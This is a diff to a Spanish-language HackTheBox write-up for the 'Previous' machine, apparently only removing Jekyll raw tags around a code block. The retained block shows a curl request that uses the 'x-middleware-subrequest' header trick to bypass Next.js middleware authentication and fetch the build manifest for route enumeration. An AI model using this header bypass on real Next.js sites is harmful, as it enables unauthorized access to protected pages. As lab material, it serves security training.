@@ -154,7 +154,6 @@ De todamas maneras sin esta via de deteccion de la vulnerabilidad, tambien lo de
 
 Una vez sabemos que en `/api` se hace referencia a archivos con extension `.js` si vemos por cada uno de estos endpoints cual es el contenido y que codigo tiene, vemos que en uno nos muestro mas endpoins de la pagina, mas en concreto : `/_next/static/qVDR2cKpRgqCslEh-llk9/_buildManifest.js`
 
-{% raw %}
 ```bash
 curl -s -X GET http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_buildManifest.js -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -H 'Cookie: next-auth.csrf-token=0cfc64cba7ac83fdebaa12d5d124c4aa9933b0787e94a09055694840cd152c72%7C77bd910322234e55aebf10c7f8bbd15c688a3837b3f12e39f7cdc6c693e3fb34; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs' | html2markdown 
 self.__BUILD_MANIFEST=function(s,e,t,c,n){return{__rewrites:{afterFiles:[],beforeFiles:[],fallback:[]},__routerFilterStatic:{numItems:0,errorRate:1e-4,numBits:0,numHashes:n,bitArray:[]},__routerFilterDynamic:{numItems:s,errorRate:1e-4,numBits:s,numHashes:n,bitArray:[]},"/":["static/chunks/pages/index-a09f42904785092c.js"],"/_error":["static/chunks/pages/_error-41608b100cc61246.js"],"/docs":[e,t,"static/chunks/pages/docs-5f6acb8b3a59fb7f.js"],"/docs/components/layout":[e,t,"static/chunks/pages/docs/components/layout-79ce7edc85dbc179.js"],"/docs/components/sidebar":[e,"static/chunks/pages/docs/components/sidebar-0302befb549e0142.js"],"/docs/content/examples":["static/chunks/pages/docs/content/examples-e4a3a28759c69901.js"],"/docs/content/getting-
@@ -162,7 +161,6 @@ started":["static/chunks/pages/docs/content/getting-
 started-7dd61d428f6ada5c.js"],"/docs/[section]":[e,t,"static/chunks/pages/docs/[section]-31d8b831c1e60f26.js"],"/signin":[t,"static/chunks/pages/signin-d0284ed11872b445.js"],sortedPages:["/","/_app","/_error","/docs","/docs/components/layout","/docs/components/sidebar","/docs/content/examples","/docs/content/getting-
 started","/docs/[section]","/signin"]}}(0,"static/chunks/8-fd0c493a642e766e.js","static/chunks/0-c54fcec2d27b858d.js",1e-4,NaN),self.__BUILD_MANIFEST_CB&&self.;__BUILD_MANIFEST_CB();
 ```
-{% endraw %}
 
 Podemos ver uno que nos llama la atencion que es `docs/content/examples` que si lo enumeramos vemos lo siguiente.
 
